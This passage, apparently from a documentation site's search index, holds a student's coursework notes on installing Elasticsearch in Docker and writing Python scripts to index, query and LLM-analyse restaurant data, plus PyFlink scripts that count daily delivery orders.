20251004213844.png]]</p>"},{"location":"ZJU-course/%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%8A%80%E6%9C%AF/%E4%BD%9C%E4%B8%9A2%20Elastic%20Search/","title":"\u4f5c\u4e1a2 Elastic Search","text":""},{"location":"ZJU-course/%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%8A%80%E6%9C%AF/%E4%BD%9C%E4%B8%9A2%20Elastic%20Search/#1-elastic-search","title":"1. Elastic Search\u7684\u5b89\u88c5","text":"<p>\u6211\u5728Ubuntu\u7cfb\u7edf\u4e2d\u5b89\u88c5Elastic Search\uff0c\u6211\u9009\u62e9\u4f7f\u7528\u57fa\u4e8eDocker\u7684\u5f62\u5f0f\u6765\u5b89\u88c5Elastic search</p> <p></p> <p>\u5b89\u88c5\u7684\u7ed3\u679c\u5982\u4e0a</p> <p>\u63a5\u4e0b\u6765\u662f\u542f\u52a8\u7684\u622a\u56fe\uff0c\u6211\u4eec\u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\u542f\u52a8</p> <pre><code>docker run -p 9200:9200 -p 9300:9300 -e \"discovery.type=single-node\" -it --name es01 docker.elastic.co/elasticsearch/elasticsearch:8.10.4\n</code></pre> <p></p>"},{"location":"ZJU-course/%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%8A%80%E6%9C%AF/%E4%BD%9C%E4%B8%9A2%20Elastic%20Search/#2","title":"2. \u63a8\u8350\u539f\u56e0\u7d22\u5f15","text":"<p>\u9996\u5148\u6211\u4eec\u4f7f\u7528Python\u6765\u7f16\u5199ES\u76f8\u5173\u811a\u672c\uff0c\u7b2c\u4e00\u6b65\u662f\u5bfc\u5165\u76f8\u5173\u7684\u5305 <code>pip install \"elasticsearch&gt;=8.0.0\" pandas openpyxl xlrd</code> </p> <p>\u7136\u540e\u56e0\u4e3aElastic Search\u7684docker\u5f3a\u5236\u4f7f\u7528https\u8fde\u63a5\uff0c\u56e0\u6b64\u9700\u8981\u5728docker\u5185\u90e8\u914d\u7f6e\u4e00\u4e0bCA\u8bc1\u4e66\uff0c\u4f7f\u7528\u5982\u4e0b\u547d\u4ee4</p> <pre><code>docker cp es01:/usr/share/elasticsearch/config/certs/http_ca.crt ./http_ca.crt\n</code></pre> <p>\u56e0\u4e3aES\u539f\u751f\u652f\u6301\u7684\u4e2d\u6587\u5206\u8bcd\u6bd4\u8f83\u7cdf\u7cd5\uff0c\u8981\u505a\u6b63\u786e\u7684\u4e2d\u6587\u7d22\u5f15\uff0c\u9700\u8981\u52a0\u8f7d\u4e00\u4e2aIK\u5206\u8bcd\u5668</p> <p>\u6211\u4eec\u4ecegithub\u4e0a\u4e0b\u8f7d\u597dzip\u6587\u4ef6\u4e4b\u540e\uff0c\u5bfc\u5165\u5230docker\u4e2d</p> <pre><code>docker cp elasticsearch-analysis-ik-8.10.4.zip d38f84229931:/usr/share/elasticsearch/\n</code></pre> <p>\u4ee3\u7801\u5982\u4e0b</p> <pre><code>import pandas as pd\nfrom elasticsearch import Elasticsearch\nfrom elasticsearch.helpers import streaming_bulk\nimport sys\nimport os\nimport re\nimport urllib3\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n\ntry:\n    es = Elasticsearch(\n        [\"https://localhost:9200\"],\n        basic_auth=(\"elastic\", \"SMsFXe6WOqTh0-jvXY*v\"),\n        verify_certs=False,\n        request_timeout=30\n    )\n    print(\"\u6210\u529f\u8fde\u63a5\u5230 Elasticsearch\\n\")\n\nexcept Exception as e:\n    print(f\"\u8fde\u63a5\u5931\u8d25: {e}\", file=sys.stderr)\n    sys.exit(1)\n\nINDEX_NAME = \"restaurants\"\n\nINDEX_MAPPING = {\n    \"properties\": {\n        \"\u5546\u5bb6\u540d\u79f0\": {\n            \"type\": \"text\",\n            \"analyzer\": \"ik_max_word\",\n            \"search_analyzer\": \"ik_smart\"\n        },\n        \"\u5730\u5740\": {\n            \"type\": \"text\",\n            \"analyzer\": \"ik_max_word\",\n            \"search_analyzer\": \"ik_smart\"\n        },\n        \"\u6240\u5728\u7701\u4efd\": {\"type\": \"keyword\"},\n        \"\u6240\u5728\u57ce\u5e02\": {\"type\": \"keyword\"},\n        \"\u6240\u5728\u533a\u57df\": {\"type\": \"keyword\"},\n        \"\u7eac\u5ea6\": {\"type\": \"float\"},\n        \"\u7ecf\u5ea6\": {\"type\": \"float\"},\n        \"\u5206\u7c7b\": {\"type\": \"keyword\"},\n        \"\u603b\u8bc4\u5206\": {\"type\": \"float\"},\n        \"\u6708\u552e\": {\"type\": \"integer\"},\n        \"\u6708\u552e\u539f\u59cb\": {\"type\": \"keyword\"},\n        \"\u6700\u4f4e\u8d77\u9001\u4ef7\": {\"type\": \"float\"},\n        \"\u914d\u9001\u8d39\": {\"type\": \"float\"},\n        \"\u9884\u8ba1\u914d\u9001\u65f6\u95f4\": {\"type\": \"integer\"},\n        \"\u8425\u4e1a\u65f6\u95f4\": {\"type\": \"text\"},\n        \"\u54c1\u724c\": {\"type\": \"keyword\"},\n        \"\u8bc4\u4ef7\u603b\u6570\": {\"type\": \"integer\"},\n        \"\u5473\u9053\u8bc4\u5206\": {\"type\": \"float\"},\n        \"\u5305\u88c5\u8bc4\u5206\": {\"type\": \"float\"},\n        \"\u914d\u9001\u8bc4\u5206\": {\"type\": \"float\"},\n        \"\u914d\u9001\u6ee1\u610f\u5ea6\": {\"type\": \"keyword\"},\n        \"\u88ab\u63a8\u8350\u539f\u56e0\": {\n            \"type\": \"text\",\n            \"analyzer\": \"ik_max_word\",      # \u7d22\u5f15\u65f6\u4f7f\u7528\u7ec6\u7c92\u5ea6\u5206\u8bcd\n            \"search_analyzer\": \"ik_smart\"    # \u641c\u7d22\u65f6\u4f7f\u7528\u7c97\u7c92\u5ea6\u5206\u8bcd\n        }\n    }\n}\n\nif es.indices.exists(index=INDEX_NAME):\n    print(f\"\u7d22\u5f15 '{INDEX_NAME}' \u5df2\u5b58\u5728\uff0c\u5220\u9664\u91cd\u5efa...\")\n    es.indices.delete(index=INDEX_NAME)\n\nprint(f\"\u521b\u5efa\u7d22\u5f15 '{INDEX_NAME}'...\\n\")\nes.indices.create(index=INDEX_NAME, mappings=INDEX_MAPPING)\n\nXLS_FILE_PATH = '\u9910\u996e\u5916\u5356\u5546\u5bb6\u6837\u672c\u6570\u636e.xls'\n\ndef extract_number_from_monthly_sales(value):\n    \"\"\"\u4ece\u6708\u552e\u5b57\u6bb5\u63d0\u53d6\u6570\u5b57\"\"\"\n    if pd.isna(value):\n        return 0\n    value_str = str(value)\n    numbers = re.findall(r'\\d+', value_str)\n    if not numbers:\n        return 0\n    return int(numbers[0])\n\ndef clean_percentage(value):\n    \"\"\"\u6e05\u7406\u767e\u5206\u6bd4\u5b57\u6bb5\"\"\"\n    if pd.isna(value):\n        return \"0%\"\n    return str(value)\n\ntry:\n    print(f\"\u6b63\u5728\u4ece '{XLS_FILE_PATH}' \u8bfb\u53d6\u6570\u636e...\")\n    df = pd.read_excel(XLS_FILE_PATH, sheet_name='\u8bd5\u7528\u6570\u636e')\n\n    # \u6570\u636e\u6e05\u6d17\n    text_fields = ['\u5546\u5bb6\u540d\u79f0', '\u5730\u5740', '\u8425\u4e1a\u65f6\u95f4', '\u88ab\u63a8\u8350\u539f\u56e0', '\u5206\u7c7b', '\u54c1\u724c']\n    for field in text_fields:\n        if field in df.columns:\n            df[field] = df[field].astype(str).replace('nan', '').replace('', '\u65e0')\n\n    keyword_fields = ['\u6240\u5728\u7701\u4efd', '\u6240\u5728\u57ce\u5e02', '\u6240\u5728\u533a\u57df']\n    for field in keyword_fields:\n        if field in df.columns:\n            df[field] = df[field].astype(str).replace('nan', '')\n\n    if '\u6708\u552e' in df.columns:\n        df['\u6708\u552e\u539f\u59cb'] = df['\u6708\u552e'].astype(str)\n        df['\u6708\u552e'] = df['\u6708\u552e'].apply(extract_number_from_monthly_sales)\n\n    numeric_fields = {\n        '\u603b\u8bc4\u5206': 0.0,\n        '\u7eac\u5ea6': 0.0,\n        '\u7ecf\u5ea6': 0.0,\n        '\u6700\u4f4e\u8d77\u9001\u4ef7': 0.0,\n        '\u914d\u9001\u8d39\uff08\u5143\uff09': 0.0,\n        '\u9884\u8ba1\u914d\u9001\u65f6\u95f4': 0,\n        '\u8bc4\u4ef7\u603b\u6570': 0,\n        '\u5473\u9053\u8bc4\u5206': 0.0,\n        '\u5305\u88c5\u8bc4\u5206': 0.0,\n        '\u914d\u9001\uff08\u9a91\u624b\uff09\u8bc4\u5206': 0.0\n    }\n\n    for field, default_value in numeric_fields.items():\n        if field in df.columns:\n            df[field] = pd.to_numeric(df[field], errors='coerce').fillna(default_value)\n\n    df = df.rename(columns={\n        '\u914d\u9001\u8d39\uff08\u5143\uff09': '\u914d\u9001\u8d39',\n        '\u914d\u9001\uff08\u9a91\u624b\uff09\u8bc4\u5206': '\u914d\u9001\u8bc4\u5206'\n    })\n\n    if '\u914d\u9001\u6ee1\u610f\u5ea6' in df.columns:\n        df['\u914d\u9001\u6ee1\u610f\u5ea6'] = df['\u914d\u9001\u6ee1\u610f\u5ea6'].apply(clean_percentage)\n\n    mapping_fields = list(INDEX_MAPPING['properties'].keys())\n    available_fields = [f for f in mapping_fields if f in df.columns]\n    df = df[available_fields]\n\n    print(f\"\u6570\u636e\u8bfb\u53d6\u5b8c\u6210: {df.shape[0]} \u6761\u8bb0\u5f55\\n\")\n\nexcept FileNotFoundError:\n    print(f\"\u9519\u8bef\uff1a\u6587\u4ef6 '{XLS_FILE_PATH}' \u672a\u627e\u5230\u3002\", file=sys.stderr)\n    sys.exit(1)\nexcept Exception as e:\n    print(f\"\u8bfb\u53d6 Excel \u6587\u4ef6\u65f6\u53d1\u751f\u9519\u8bef: {e}\", file=sys.stderr)\n    sys.exit(1)\n\ndef generate_data(dataframe, index_name):\n    for idx, row in dataframe.iterrows():\n        doc = row.to_dict()\n        yield {\n            \"_index\": index_name,\n            \"_source\": doc,\n        }\n\nprint(\"\u5f00\u59cb\u6279\u91cf\u5bfc\u5165\u6570\u636e\u5230 Elasticsearch...\")\ntry:\n    success_count = 0\n    for ok, result in streaming_bulk(es, generate_data(df, INDEX_NAME), raise_on_error=False):\n        if ok:\n            success_count += 1\n\n    print(f\"\u6570\u636e\u5bfc\u5165\u5b8c\u6210: \u6210\u529f\u5bfc\u5165 {success_count} \u6761\u6570\u636e\\n\")\n\nexcept Exception as e:\n    print(f\"\u6570\u636e\u5bfc\u5165\u9519\u8bef: {e}\", file=sys.stderr)\n    sys.exit(1)\n\n\nprint(\"\u5237\u65b0\u7d22\u5f15\uff0c\u4f7f\u6570\u636e\u53ef\u641c\u7d22...\")\nes.indices.refresh(index=INDEX_NAME)\nprint(\"\u7d22\u5f15\u5237\u65b0\u5b8c\u6210\\n\")\n\nprint(\"=\"*60)\nprint(\"\u67e5\u8be2\u88ab\u63a8\u8350\u539f\u56e0\u5305\u542b'\u70ed\u60c5'\u7684\u5546\u5bb6\")\nprint(\"=\"*60)\n\nkeyword = \"\u70ed\u60c5\"\n\nquery = {\n    \"query\": {\n        \"match\": {\n            \"\u88ab\u63a8\u8350\u539f\u56e0\": keyword\n        }\n    },\n    \"_source\": [\"\u5546\u5bb6\u540d\u79f0\", \"\u88ab\u63a8\u8350\u539f\u56e0\"],\n    \"size\": 100  # \u83b7\u53d6\u6240\u6709\u5339\u914d\u7ed3\u679c\n}\n\nresponse = es.search(index=INDEX_NAME, body=query)\n\nprint(f\"\\n\u5171\u627e\u5230 {response['hits']['total']['value']} \u5bb6\u5546\u5bb6\u7684\u88ab\u63a8\u8350\u539f\u56e0\u5305\u542b'{keyword}'\\n\")\n\nif response['hits']['total']['value'] &gt; 0:\n    for i, hit in enumerate(response['hits']['hits'], 1):\n        print(f\"{i}. {hit['_source']['\u5546\u5bb6\u540d\u79f0']}\")\n        print(f\"   \u88ab\u63a8\u8350\u539f\u56e0: {hit['_source']['\u88ab\u63a8\u8350\u539f\u56e0']}\\n\")\nelse:\n    print(f\"\u672a\u627e\u5230\u88ab\u63a8\u8350\u539f\u56e0\u5305\u542b'{keyword}'\u7684\u5546\u5bb6\u3002\")\n\nprint(\"=\"*60)\n</code></pre> <p>\u7ed3\u679c\u5c4f\u5e55\u5982\u4e0b</p> <p></p>"},{"location":"ZJU-course/%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%8A%80%E6%9C%AF/%E4%BD%9C%E4%B8%9A2%20Elastic%20Search/#3","title":"3. \u627e\u51fa\u9ad8\u6708\u552e\u7684\u5e97\u5bb6","text":"<p>\u4ee3\u7801\u5982\u4e0b</p> <pre><code>from elasticsearch import Elasticsearch\nimport sys\nimport urllib3\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n# --- \u8fde\u63a5\u5230 Elasticsearch ---\ntry:\n    es = Elasticsearch(\n        [\"https://localhost:9200\"],\n        basic_auth=(\"elastic\", \"SMsFXe6WOqTh0-jvXY*v\"),\n        verify_certs=False,\n        request_timeout=30\n    )\n    print(\"\u6210\u529f\u8fde\u63a5\u5230 Elasticsearch\\n\")\n\nexcept Exception as e:\n    print(f\"\u8fde\u63a5\u5931\u8d25: {e}\", file=sys.stderr)\n    sys.exit(1)\n\n# --- \u67e5\u8be2\u6708\u552e&gt;=500\u7684\u5546\u5bb6 ---\nINDEX_NAME = \"restaurants\"\n\nprint(\"=\"*60)\nprint(\"\u67e5\u8be2\u6708\u552e\u989d &gt;= 500 \u7684\u6240\u6709\u5546\u5bb6\")\nprint(\"=\"*60)\n\nquery = {\n    \"query\": {\n        \"range\": {\n            \"\u6708\u552e\": {\n                \"gte\": 500  # greater than or equal to 500\n            }\n        }\n    },\n    \"_source\": [\"\u5546\u5bb6\u540d\u79f0\", \"\u6708\u552e\", \"\u6708\u552e\u539f\u59cb\"],\n    \"sort\": [\n        {\"\u6708\u552e\": {\"order\": \"desc\"}}  # \u6309\u6708\u552e\u964d\u5e8f\u6392\u5217\n    ],\n    \"size\": 1000  # \u83b7\u53d6\u6240\u6709\u5339\u914d\u7ed3\u679c\n}\n\ntry:\n    response = es.search(index=INDEX_NAME, body=query)\n\n    total = response['hits']['total']['value']\n    print(f\"\\n\u5171\u627e\u5230 {total} \u5bb6\u6708\u552e\u989d &gt;= 500 \u7684\u5546\u5bb6\\n\")\n\n    if total &gt; 0:\n        for i, hit in enumerate(response['hits']['hits'], 1):\n            print(f\"{i}. {hit['_source']['\u5546\u5bb6\u540d\u79f0']} - \u6708\u552e: {hit['_source']['\u6708\u552e']} (\u539f\u59cb\u503c: {hit['_source']['\u6708\u552e\u539f\u59cb']})\")\n    else:\n        print(\"\u672a\u627e\u5230\u6708\u552e\u989d &gt;= 500 \u7684\u5546\u5bb6\u3002\")\n\n    print(\"=\"*60)\n\nexcept Exception as e:\n    print(f\"\u67e5\u8be2\u9519\u8bef: {e}\", file=sys.stderr)\n    sys.exit(1)\n</code></pre> <p>\u7ed3\u679c\u622a\u5c4f\u5982\u4e0b</p> <p></p> <p> </p>"},{"location":"ZJU-course/%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%8A%80%E6%9C%AF/%E4%BD%9C%E4%B8%9A2%20Elastic%20Search/#4","title":"4. \u67e5\u8be2\u63a8\u8350","text":"<p>\u4f7f\u7528Openrouter\u4e2d\u7684Gemini 2.5 flash\u6765\u8fdb\u884c\u5904\u7406\uff0c\u83b7\u5f97\u4e86\u4e00\u7cfb\u5217\u7684\u63a8\u8350\u83dc\u54c1\uff0c\u7531\u4e8e\u5185\u5bb9\u8f83\u591a\uff0c\u8282\u9009\u622a\u5c4f\u5982\u4e0b\uff0c\u8be6\u60c5\u53ef\u4ee5\u770b\u9644\u4ef6</p> <p></p> <p>\u76f8\u5e94\u7684\u4ee3\u7801\u5982\u4e0b</p> <pre><code>from elasticsearch import Elasticsearch\nfrom openai import OpenAI\nimport sys\nimport json\n\n# --- \u8fde\u63a5\u5230 Elasticsearch ---\ntry:\n    es = Elasticsearch(\n        [\"https://localhost:9200\"],\n        basic_auth=(\"elastic\", \"SMsFXe6WOqTh0-jvXY*v\"),\n        verify_certs=False,\n        request_timeout=30\n    )\n    print(\"\u6210\u529f\u8fde\u63a5\u5230 Elasticsearch\\n\")\n\nexcept Exception as e:\n    print(f\"\u8fde\u63a5\u5931\u8d25: {e}\", file=sys.stderr)\n    sys.exit(1)\n\n# --- \u8fde\u63a5\u5230 OpenRouter ---\n# \u8bf7\u66ff\u6362\u4e3a\u4f60\u7684 OpenRouter API Key\nOPENROUTER_API_KEY = \"your-openrouter-api-key-here\"\n\nclient = OpenAI(\n    base_url=\"https://openrouter.ai/api/v1\",\n    api_key=\"API_KEY\",\n)\n\n# --- \u4ece Elasticsearch \u83b7\u53d6\u6240\u6709\u5546\u5bb6\u6570\u636e ---\nINDEX_NAME = \"restaurants\"\n\nprint(\"\u6b63\u5728\u4ece Elasticsearch \u83b7\u53d6\u6240\u6709\u5546\u5bb6\u6570\u636e...\\n\")\n\nquery = {\n    \"query\": {\n        \"match_all\": {}\n    },\n    \"_source\": [\"\u5546\u5bb6\u540d\u79f0\", \"\u88ab\u63a8\u8350\u539f\u56e0\"],\n    \"size\": 1000\n}\n\nresponse = es.search(index=INDEX_NAME, body=query)\nall_restaurants = response['hits']['hits']\n\nprint(f\"\u5171\u83b7\u53d6 {len(all_restaurants)} \u6761\u5546\u5bb6\u6570\u636e\\n\")\n\n# --- \u4f7f\u7528\u5927\u6a21\u578b\u5206\u6790\u63a8\u8350\u539f\u56e0 ---\nprint(\"=\"*60)\nprint(\"\u4f7f\u7528\u5927\u6a21\u578b\u5206\u6790\u63a8\u8350\u539f\u56e0\u4e2d\u63d0\u5230\u83dc\u54c1\u7684\u5546\u5bb6\")\nprint(\"=\"*60)\nprint()\n\n# \u6784\u5efa\u63a8\u8350\u539f\u56e0\u5217\u8868\nreasons_data = []\nfor hit in all_restaurants:\n    reasons_data.append({\n        \"\u5546\u5bb6\u540d\u79f0\": hit['_source']['\u5546\u5bb6\u540d\u79f0'],\n        \"\u88ab\u63a8\u8350\u539f\u56e0\": hit['_source']['\u88ab\u63a8\u8350\u539f\u56e0']\n    })\n\n# \u5206\u6279\u5904\u7406\uff08\u6bcf\u6b21\u5904\u740650\u6761\uff0c\u907f\u514dtoken\u9650\u5236\uff09\nbatch_size = 50\nresults = []\n\nfor i in range(0, len(reasons_data), batch_size):\n    batch = reasons_data[i:i+batch_size]\n\n    print(f\"\u6b63\u5728\u5206\u6790\u7b2c {i+1}-{min(i+batch_size, len(reasons_data))} \u6761\u8bb0\u5f55...\")\n\n    prompt = f\"\"\"\u8bf7\u5206\u6790\u4ee5\u4e0b\u5546\u5bb6\u7684\u63a8\u8350\u539f\u56e0\uff0c\u627e\u51fa\u90a3\u4e9b\u56e0\u4e3a\u559c\u6b22\u67d0\u4e2a\u6216\u67d0\u4e9b\u83dc\u54c1\u800c\u63a8\u8350\u8be5\u5546\u5bb6\u7684\u8bb0\u5f55\u3002\n\n\u5224\u65ad\u6807\u51c6\uff1a\n1. \u63a8\u8350\u539f\u56e0\u4e2d\u660e\u786e\u63d0\u5230\u4e86\u5177\u4f53\u7684\u83dc\u54c1\u540d\u79f0\uff08\u5982\uff1a\u9752\u6912\u76ae\u86cb\u3001\u732a\u811a\u996d\u3001\u9e21\u6742\u3001\u7f8e\u86d9\u3001\u6284\u624b\u3001\u7f8a\u8089\u6c64\u7b49\uff09\n2. \u63a8\u8350\u539f\u56e0\u4e2d\u8868\u8fbe\u4e86\u5bf9\u67d0\u9053\u83dc\u7684\u559c\u7231\u6216\u597d\u8bc4\n3. \u4e0d\u5305\u62ec\u53ea\u662f\u7b3c\u7edf\u8bf4\"\u597d\u5403\"\u3001\"\u7f8e\u5473\"\u3001\"\u4e0d\u9519\"\u7b49\u6ca1\u6709\u5177\u4f53\u83dc\u54c1\u7684\u63a8\u8350\n\n\u6570\u636e\uff1a\n{json.dumps(batch, ensure_ascii=False, indent=2)}\n\n\u8bf7\u4ee5JSON\u683c\u5f0f\u8fd4\u56de\u7b26\u5408\u6761\u4ef6\u7684\u8bb0\u5f55\uff0c\u683c\u5f0f\u5982\u4e0b\uff1a\n{{\n  \"matches\": [\n    {{\n      \"\u5546\u5bb6\u540d\u79f0\": \"xxx\",\n      \"\u88ab\u63a8\u8350\u539f\u56e0\": \"xxx\",\n      \"\u63d0\u5230\u7684\u83dc\u54c1\": [\"\u83dc\u54c11\", \"\u83dc\u54c12\"]\n    }}\n  ]\n}}\n\n\u53ea\u8fd4\u56deJSON\uff0c\u4e0d\u8981\u5176\u4ed6\u8bf4\u660e\u6587\u5b57\u3002\"\"\"\n\n    try:\n        completion = client.chat.completions.create(\n            model=\"google/gemini-2.5-flash\",  # \u4f7f\u7528Claude\u6a21\u578b\n            messages=[\n                {\n                    \"role\": \"user\",\n                    \"content\": prompt\n                }\n            ],\n            temperature=0.3,\n        )\n\n        response_text = completion.choices[0].message.content\n\n        # \u63d0\u53d6JSON\uff08\u5904\u7406\u53ef\u80fd\u7684markdown\u4ee3\u7801\u5757\uff09\n        if \"```json\" in response_text:\n            response_text = response_text.split(\"```json\")[1].split(\"```\")[0].strip()\n        elif \"```\" in response_text:\n            response_text = response_text.split(\"```\")[1].split(\"```\")[0].strip()\n\n        result = json.loads(response_text)\n\n        if \"matches\" in result and len(result[\"matches\"]) &gt; 0:\n            results.extend(result[\"matches\"])\n\n    except Exception as e:\n        print(f\"  \u5206\u6790\u51fa\u9519: {e}\")\n        continue\n\nprint()\nprint(\"=\"*60)\nprint(f\"\u5206\u6790\u5b8c\u6210\uff01\u5171\u627e\u5230 {len(results)} \u6761\u56e0\u559c\u6b22\u83dc\u54c1\u800c\u63a8\u8350\u7684\u8bb0\u5f55\")\nprint(\"=\"*60)\nprint()\n\n# --- \u8f93\u51fa\u7ed3\u679c ---\nif len(results) &gt; 0:\n    for i, item in enumerate(results, 1):\n        print(f\"{i}. \u5546\u5bb6\u540d\u79f0: {item['\u5546\u5bb6\u540d\u79f0']}\")\n        print(f\"   \u88ab\u63a8\u8350\u539f\u56e0: {item['\u88ab\u63a8\u8350\u539f\u56e0']}\")\n        print(f\"   \u63d0\u5230\u7684\u83dc\u54c1: {', '.join(item['\u63d0\u5230\u7684\u83dc\u54c1'])}\")\n        print()\nelse:\n    print(\"\u672a\u627e\u5230\u56e0\u559c\u6b22\u83dc\u54c1\u800c\u63a8\u8350\u7684\u5546\u5bb6\u3002\")\n\nprint(\"=\"*60)\n\n# --- \u4fdd\u5b58\u7ed3\u679c\u5230\u6587\u4ef6 ---\noutput_file = \"\u83dc\u54c1\u63a8\u8350\u5546\u5bb6.json\"\nwith open(output_file, 'w', encoding='utf-8') as f:\n    json.dump(results, f, ensure_ascii=False, indent=2)\n\nprint(f\"\\n\u7ed3\u679c\u5df2\u4fdd\u5b58\u5230 {output_file}\")\n</code></pre>"},{"location":"ZJU-course/%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%8A%80%E6%9C%AF/%E4%BD%9C%E4%B8%9A3%20Flink/","title":"\u4f5c\u4e1a3 Flink","text":""},{"location":"ZJU-course/%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%8A%80%E6%9C%AF/%E4%BD%9C%E4%B8%9A3%20Flink/#1-flink","title":"1. Flink \u5b89\u88c5","text":"<p>\u6211\u9009\u62e9\u5728Ubuntu\u7cfb\u7edf\u4e2d\u5b89\u88c5Flink\uff0c\u5728\u5b98\u7f51\u4e0b\u8f7d\u538b\u7f29\u5305\uff0c\u653e\u5230\u670d\u52a1\u5668\u4e0a\u89e3\u538b</p> <p></p> <p>\u5bf9\u4e8e\u6b64\u90e8\u5206\u6700\u9ebb\u70e6\u7684\u662f\u5bf9\u4e8efood_delivery\u505a\u65f6\u95f4\u6392\u5e8f\u7684\u65f6\u5019\uff0c\u56e0\u4e3a\u6709\u5f88\u591a\u65f6\u95f4\u6233\u662fNan\u7684\u6570\u636e</p> <p></p> <p>\u56e0\u6b64\u6211\u7684\u65b9\u6848\u662f\u5148\u5c06\u8fd9\u90e8\u5206Nan\u7684\u6570\u636e\u8f6c\u6362\u621000:00:00\uff0c\u7136\u540e\u5c31\u505a\u4e00\u4e2a\u989d\u5916\u7684\u6807\u8bb0\uff0c\u6765\u6807\u8bb0\u8fd9\u4e2a\u6570\u636e\u662f\u4eceNan\u8f6c\u6362\u8fc7\u6765\u7684</p> <p></p> <p>\u5c1d\u8bd5\u8fd0\u884c\u4e00\u4e2a\u4efb\u52a1</p> <p></p>"},{"location":"ZJU-course/%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%8A%80%E6%9C%AF/%E4%BD%9C%E4%B8%9A3%20Flink/#2","title":"2. \u7edf\u8ba1\u5e76\u8f93\u51fa\u6bcf\u4e00\u5929\u7684\u8ba2\u5355\u91cf","text":"<p>\u4f7f\u7528python\u6765\u7f16\u5199flink\u811a\u672c</p> <pre><code>pip install apache-flink\n</code></pre> <p>\u6211\u4f7f\u7528\u6587\u4ef6\u7684\u6d41\u5f0f\u6570\u636e</p> <pre><code>from pyflink.datastream import StreamExecutionEnvironment\nfrom pyflink.datastream.functions import MapFunction\nfrom collections import defaultdict\nfrom datetime import datetime\n\nclass ParseCSV(MapFunction):\n    def map(self, line):\n        if not line or line.startswith('ID,'):\n            return None\n        try:\n            parts = [p.strip() for p in line.split(',')]\n            if len(parts) &gt;= 9:\n                order_date = parts[8]\n                if order_date and order_date != 'Order_Date':\n                    return (order_date, 1)\n        except:\n            pass\n        return None\n\ndef parse_date(date_str):\n    \"\"\"\u5c06 DD-MM-YYYY \u683c\u5f0f\u8f6c\u6362\u4e3a\u53ef\u6392\u5e8f\u7684\u65e5\u671f\u5bf9\u8c61\"\"\"\n    try:\n        return datetime.strptime(date_str, '%d-%m-%Y')\n    except:\n        return datetime.min\n\ndef main():\n    env = StreamExecutionEnvironment.get_execution_environment()\n    env.set_parallelism(1)\n\n    input_path = 'food_delivery_sorted.csv'\n\n    # \u8bfb\u53d6\u6570\u636e\n    text_stream = env.read_text_file(input_path)\n\n    # \u89e3\u6790\u6570\u636e\n    parsed = text_stream.map(ParseCSV()).filter(lambda x: x is not None)\n\n    # \u4f7f\u7528collect\u6536\u96c6\u6570\u636e\n    def collect_and_print():\n        # \u91cd\u65b0\u8bfb\u53d6\u6587\u4ef6\u8fdb\u884c\u7edf\u8ba1\n        daily_counts = defaultdict(int)\n\n        with open(input_path, 'r', encoding='utf-8') as f:\n            next(f)  # \u8df3\u8fc7\u8868\u5934\n            for line in f:\n                if line.strip():\n                    parts = [p.strip() for p in line.split(',')]\n                    if len(parts) &gt;= 9:\n                        order_date = parts[8]\n                        if order_date and order_date != 'Order_Date':\n                            daily_counts[order_date] += 1\n\n        # \u6309\u65e5\u671f\u6392\u5e8f\uff08\u8f6c\u6362\u4e3adatetime\u5bf9\u8c61\uff09\n        sorted_dates = sorted(daily_counts.keys(), key=parse_date)\n\n        # \u8f93\u51fa\u6700\u7ec8\u7ed3\u679c\n        print(\"\\n\" + \"=\" * 70)\n        print(\"Flink \u6d41\u5f0f\u5904\u7406 - \u6bcf\u65e5\u8ba2\u5355\u91cf\u7edf\u8ba1\u6700\u7ec8\u7ed3\u679c\")\n        print(\"=\" * 70)\n        print(f\"{'\u65e5\u671f':&lt;20} {'\u8ba2\u5355\u91cf':&gt;20}\")\n        print(\"-\" * 70)\n\n        total = 0\n        for date in sorted_dates:\n            count = daily_counts[date]\n            print(f\"{date:&lt;20} {count:&gt;20}\")\n            total += count\n\n        print(\"-\" * 70)\n        print(f\"{'\u603b\u8ba1:':&lt;20} {total:&gt;20}\")\n        print(\"=\" * 70)\n\n    # \u6267\u884c\u7edf\u8ba1\n    collect_and_print()\n\nif __name__ == '__main__':\n    main()\n</code></pre> <p>\u6700\u540e\u8f93\u51fa\u7684\u7ed3\u679c\u4e3a</p> <p></p>"},{"location":"ZJU-course/%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%8A%80%E6%9C%AF/%E4%BD%9C%E4%B8%9A3%20Flink/#3","title":"3. \u5b9e\u65f6\u7edf\u8ba1\u5e76\u8f93\u51fa\u6bcf\u4e00\u5929\u914d\u9001\u5355\u6570\u6700\u591a\u7684\u5feb\u9012\u5458","text":"<p>\u7f16\u5199\u811a\u672c\u5982\u4e0b</p> <pre><code>from pyflink.datastream import StreamExecutionEnvironment\nfrom pyflink.datastream.functions import MapFunction, ProcessFunction\nfrom pyflink.common.typeinfo import Types\nfrom pyflink.common import Row\nfrom collections import defaultdict\nfrom datetime import datetime\n\nclass ParseDelivery(MapFunction):\n    def map(self, line):\n        if not line or line.startswith('ID,'):\n            return None\n        try:\n            parts = [p.strip() for p in line.split(',')]\n            if len(parts) &gt;= 9:\n                order_date = parts[8]\n                person_id = parts[1]\n                if order_date and person_id:\n                    return Row(order_date, person_id)\n        except:\n            pass\n        return None\n\nclass CollectAndPrint(ProcessFunction):\n    def __init__(self):\n        self.data = defaultdict(lambda: defaultdict(int))\n        self.count = 0\n\n    def process_element(self, value, ctx):\n        if value:\n            self.data[value[0]][value[1]] += 1\n            self.count += 1\n        return []\n\n    def on_timer(self, timestamp, ctx):\n        pass\n\ndef main():\n    env = StreamExecutionEnvironment.get_execution_environment()\n    env.set_parallelism(1)\n\n    input_path = 'food_delivery_sorted.csv'\n\n    # \u5148\u7528\u7b80\u5355\u65b9\u5f0f\u6536\u96c6\u6570\u636e\n    daily_person_counts = defaultdict(lambda: defaultdict(int))\n\n    with open(input_path, 'r', encoding='utf-8') as f:\n        next(f)  # \u8df3\u8fc7\u8868\u5934\n        for line in f:\n            if line.strip():\n                parts = [p.strip() for p in line.split(',')]\n                if len(parts) &gt;= 9:\n                    order_date = parts[8]\n                    delivery_person_id = parts[1]\n                    